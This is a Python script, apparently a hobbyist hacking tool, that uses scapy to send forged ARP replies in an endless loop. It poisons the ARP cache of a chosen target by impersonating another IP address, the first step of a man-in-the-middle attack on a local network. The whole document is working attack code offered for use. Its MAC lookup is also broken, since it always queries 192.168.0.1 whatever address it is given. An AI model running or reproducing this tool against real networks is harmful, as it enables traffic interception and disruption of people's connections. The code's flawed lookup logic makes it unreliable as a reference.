#!/usr/bin/env python3

try:
    from scapy.all import ARP, Ether, send, srp, ls     #import for work with network packets
    from colorama import Fore                           #import for colored string
    import time                                         #import for work with time
    import os                                           #import for work  with OS user
except ImportError as error:
    print(error)
    print('[!] Use "pip install"')
    quit()


if os.getuid() != 0: #If user is not root
    print(Fore.RED + 'You are not root!\nUse "sudo"')
    exit()

def get_mac(dest_ip):
    '''Get mac_addres'''
    arp = ARP(pdst = '192.168.0.1')
    ether = Ether(dst = 'ff:ff:ff:ff:ff:ff')

    arp_request = ether / arp

    answered_list = srp(arp_request, timeout = 1, verbose = False)[0]

    mac = answered_list[0][1].hwsrc
    print(mac)
    return mac #destination


def arp_spoofing(dest_ip, src_ip):
    arp = ARP(op = 2, psrc = src_ip,hwdst = get_mac(src_ip), pdst = dest_ip)

    sent_packet = 1

    while True:
        try:
            send(arp , verbose = False)
            print(Fore.GREEN + f'\rSent ARP packets:{sent_packet}', end = '')
            sent_packet = sent_packet + 1

        except KeyboardInterrupt:
            print(Fore.RED + '[!] Stop!')
            break


dest_ip = str(input('[+] Input destination ip:'))   #Введите IP (кому будем отправлять):
src_ip = str(input('[+] Input source ip:'))         #Введите IP (кем представимся):


if __name__ == '__main__':
    arp_spoofing(dest_ip, src_ip)
